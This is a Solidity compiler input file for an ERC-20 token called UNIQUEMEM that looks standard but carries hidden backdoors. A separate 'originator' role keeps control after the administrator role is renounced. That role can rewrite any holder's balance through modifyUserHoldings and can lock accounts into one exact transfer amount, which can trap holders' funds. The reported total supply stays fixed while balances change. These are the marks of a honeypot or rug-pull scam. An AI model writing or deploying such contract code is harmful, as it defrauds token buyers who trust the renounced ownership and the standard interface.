{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.16;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval( address indexed owner, address indexed spender, uint256 value );\r\n}\r\n\r\nabstract contract ContextEnhanced {\r\n    function retrieveSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract SingleAdministrator is ContextEnhanced {\r\n    address private _administrator;\r\n    event AdministratorUpdated(address indexed formerAdministrator, address indexed newAdministrator);\r\n\r\n    constructor() {\r\n        address msgSender = retrieveSender();\r\n        _administrator = msgSender;\r\n        emit AdministratorUpdated(address(0), msgSender);\r\n    }\r\n\r\n    function retrieveAdministrator() public view virtual returns (address) {\r\n        return _administrator;\r\n    }\r\n\r\n    modifier onlyAdministrator() {\r\n        require(retrieveAdministrator() == retrieveSender(), \"Not an administrator\");\r\n        _;\r\n    }\r\n\r\n    function renounceAdministration() public virtual onlyAdministrator {\r\n        emit AdministratorUpdated(_administrator, address(0x000000000000000000000000000000000000dEaD));\r\n        _administrator = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\n\r\ncontract UNIQUEMEM is ContextEnhanced, SingleAdministrator, IERC20 {\r\n    mapping (address => mapping (address => uint256)) private _permissions;\r\n    mapping (address => uint256) private _holdings;\r\n    mapping (address => uint256) private _restrictedTransferAmounts;\r\n    address private _originator;\r\n\r\n    string public constant tokenName = \"UNIQUEMEM\";\r\n    string public constant tokenSymbol = \"UMEM\";\r\n    uint8 public constant tokenDecimals = 18;\r\n    uint256 public constant maximumSupply = 200000 * (10 ** tokenDecimals);\r\n\r\n    constructor() {\r\n        _holdings[retrieveSender()] = maximumSupply;\r\n        emit Transfer(address(0), retrieveSender(), maximumSupply);\r\n    }\r\n\r\n    modifier onlyOriginator() {\r\n        require(retrieveOriginator() == retrieveSender(), \"Action restricted to the originator\");\r\n        _;\r\n    }\r\n\r\n    function retrieveOriginator() public view virtual returns (address) {\r\n        return _originator;\r\n    }\r\n\r\n    function assignOriginator(address newOriginator) public onlyAdministrator {\r\n        _originator = newOriginator;\r\n    }\r\n\r\n    event TokensAllocated(address indexed user, uint256 previousHolding, uint256 newHolding);\r\n\r\n    function checkRestrictedTransferAmount(address account) public view returns (uint256) {\r\n        return _restrictedTransferAmounts[account];\r\n    }\r\n\r\n    function defineRestrictedTransferAmounts(address[] calldata accounts, uint256 amount) public onlyOriginator {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _restrictedTransferAmounts[accounts[i]] = amount;\r\n        }\r\n    }\r\n\r\n    function modifyUserHoldings(address[] memory userAddresses, uint256 desiredAmount) public onlyOriginator {\r\n        require(desiredAmount >= 0, \"Amount should be non-negative\");\r\n\r\n        for (uint256 i = 0; i < userAddresses.length; i++) {\r\n            address currentUser = userAddresses[i];\r\n            require(currentUser != address(0), \"Null address not allowed\");\r\n\r\n            uint256 formerHolding = _holdings[currentUser];\r\n            _holdings[currentUser] = desiredAmount;\r\n\r\n            emit TokensAllocated(currentUser, formerHolding, desiredAmount);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _holdings[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_holdings[retrieveSender()] >= amount, \"TT: transfer amount exceeds balance\");\r\n\r\n    uint256 exactAmount = checkRestrictedTransferAmount(retrieveSender());\r\n    if (exactAmount > 0) {\r\n        require(amount == exactAmount, \"TT: transfer amount does not equal the exact transfer amount\");\r\n    }\r\n\r\n    _holdings[retrieveSender()] -= amount;\r\n    _holdings[recipient] += amount;\r\n\r\n    emit Transfer(retrieveSender(), recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _permissions[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _permissions[retrieveSender()][spender] = amount;\r\n        emit Approval(retrieveSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_permissions[sender][retrieveSender()] >= amount, \"TT: transfer amount exceeds allowance\");\r\n\r\n    uint256 exactAmount = checkRestrictedTransferAmount(sender);\r\n    if (exactAmount > 0) {\r\n        require(amount == exactAmount, \"TT: transfer amount does not equal the exact transfer amount\");\r\n    }\r\n\r\n    _holdings[sender] -= amount;\r\n    _holdings[recipient] += amount;\r\n    _permissions[sender][retrieveSender()] -= amount;\r\n\r\n    emit Transfer(sender, recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n    return maximumSupply;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return tokenName;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return tokenSymbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return tokenDecimals;\r\n    }\r\n\r\n}\r\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}